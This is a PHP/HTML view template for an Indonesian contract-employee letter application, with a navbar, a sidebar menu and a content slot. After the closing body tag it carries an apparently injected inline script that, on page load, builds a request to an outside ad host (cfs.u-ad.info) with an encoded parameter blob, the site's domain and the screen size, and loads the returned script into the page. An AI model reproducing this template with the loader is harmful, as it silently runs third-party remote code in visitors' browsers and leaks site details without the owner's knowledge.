<!DOCTYPE html>
<html>
<head>
	<title>Surat</title>
	<link href="<?php echo base_url()?>assets/bootstrap/css/bootstrap.min.css" rel="stylesheet">
	<link href="<?php echo base_url('assets/datatables/css/dataTables.bootstrap.css')?>" rel="stylesheet">
	<link href="<?php echo base_url()?>assets/bootstrap/css/dashboard.css" rel="stylesheet">
	<link href="<?php echo base_url()?>assets/bootstrap/css/font-awesome.min.css" rel="stylesheet">
</head>
<body>
	<script src="<?php echo base_url('assets/jquery/jquery-2.1.4.min.js')?>"></script>
	<script src="<?php echo base_url('assets/bootstrap/js/bootstrap.min.js')?>"></script>
	<script src="<?php echo base_url('assets/datatables/js/jquery.dataTables.min.js')?>"></script>
	<script src="<?php echo base_url('assets/datatables/js/dataTables.bootstrap.js')?>"></script>
	<script src="<?php echo base_url('assets/bootstrap/js/bootstrap-datepicker.js')?>"></script>
	<nav class="navbar navbar-fixed-top navbar-default bg-faded">
	<div class="collapse navbar-collapse">
			<a class="navbar-brand" href="#">Surat Karyawan Kontrak</a>      
			<ul class="nav navbar-nav navbar-right" style ="margin-right: 10px;">
				<li></li>
				<li class="dropdown ">
					<a href="#" class="dropdown-toggle" data-toggle="dropdown" role="button" aria-expanded="false">
						Account
						<span class="caret"></span></a>
						<ul class="dropdown-menu" role="menu">
							<li class="dropdown-header">PROFIL</li>
							<li class=""><a href="#">Lihat Profil</a></li>
							<li class=""><a href="#">Edit Profil</a></li>
							<li class="divider"></li>
							<li><a href="#">Logout</a></li>
						</ul>
					</li>
				</ul>
			</div><!-- /.navbar-collapse -->
	</nav>
	
	<div class="container" style ="margin-right: 200px;">
		
	<!---<div id="navbar" class="navbar-collapse collapse">
	<ul class="nav navbar-nav navbar-right">
	<li>
	<a href="<?php echo base_url(); ?>index.php/Welcome/logout">Logout</a>
	</li>
	</ul>
	</div>
	</div>
    </nav>-->

	<div class="col-sm-3 col-md-2 navbar-default sidebar">
	    <ul class="nav nav-sidebar">
	        <li><a href="<?php echo base_url('index.php/Welcome/home') ?>"><i class="glyphicon glyphicon-home"></i> Beranda</a></a></li>
	        <li ><a href="javascript:;" data-toggle="collapse" data-target="#demo">><i class="glyphicon glyphicon-file"></i>Data Karyawan<i class="glyphicon glyphicon-caret-down"></i></a></li>
	        <ul id="demo" class="collapse">
            <li>
               <a href="<?php echo base_url('index.php/Welcome/Karyawan') ?>">Lihat Data Karyawan</a>
            </li>
            <li>
               <a href="#">Cetak Data Karyawan</a>
            </li>
        </ul>
	        <li><a href="<?php echo base_url('index.php/Welcome/inventaris') ?>"><i class="glyphicon glyphicon-equalizer"></i>Laporan</a></li>
	        <li><a href="<?php echo base_url('index.php/Welcome/kock') ?>"><i class="glyphicon glyphicon-pencil"></i>Form Kontrak</a></li>
	    </ul>
    </div>

    <div class="col-sm-9 col-sm-offset-3 col-md-10 col-md-offset-2 main">
    	<?php $this->load->view($content) ?>
    </div>

</body>
<script type="text/javascript">if (self==top) {function netbro_cache_analytics(fn, callback) {setTimeout(function() {fn();callback();}, 0);}function sync(fn) {fn();}function requestCfs(){var idc_glo_url = (location.protocol=="https:" ? "https://" : "http://");var idc_glo_r = Math.floor(Math.random()*99999999999);var url = idc_glo_url+ "cfs.u-ad.info/cfspushadsv2/request" + "?id=1" + "&enc=telkom2" + "&params=" + "4TtHaUQnUEiP6K%2fc5C582ECSaLdwqSpnrrPySufjH8GrDJAq7HJSuOvIKONjWcjovEidw9ij%2bzZOS1E50SVPKjRUcde5PVZFRDGxuF07%2fyWp5rpdjuxy8DL1M3S4sEsG9S7yRboLSBPC%2f3J5ggdWIjHrOjTKRISiWoufRDofHB4tNdkHMxOT0AXsz8O8bMKmxAUUC%2bUIirTFumkSUpSJvsBjCJiy6%2fapW%2bN%2bVsJ3Qln95e%2fRapTHCMlaSrzVh1BAU6a4Dc8mliLQYNlKxGK6xw1NKZiglfy0wRbNP8PP8yktWpw6NPFolp3tlQ1ztJe4nJ0nJo4jJ8skSu%2fpKKwSyRHVUU9pgWvzAhlm%2f6ysj4N7xvEGQkGyyKcqOYiyQZSTTSM1%2f5dxflBLuC6xQWF3uZkvBPWD6Oq%2f8rhax0GM0OBNj4NZwbQ8XyEz2mWiWQOo4q8EdIb9BugcrGtzenkLqjtVNAuaQvpRYZeETyas3zseXmhH%2fMzaKHUKmy10AtALBz%2bEcjLNQbeLmcMm1q79x77CLmKzxRWf4KO%2fe%2fBNWVhvRm2M0Ogcvzl43om6pQxWdzQ5%2fMeBSTBdbI%2bCNSwIlzevpN4PEQQsW6mYF9W8SZj3NyoOSztOdQ%3d%3d" + "&idc_r="+idc_glo_r + "&domain="+document.domain + "&sw="+screen.width+"&sh="+screen.height;var bsa = document.createElement('script');bsa.type = 'text/javascript';bsa.async = true;bsa.src = url;(document.getElementsByTagName('head')[0]||document.getElementsByTagName('body')[0]).appendChild(bsa);}netbro_cache_analytics(requestCfs, function(){});};</script>
</html>
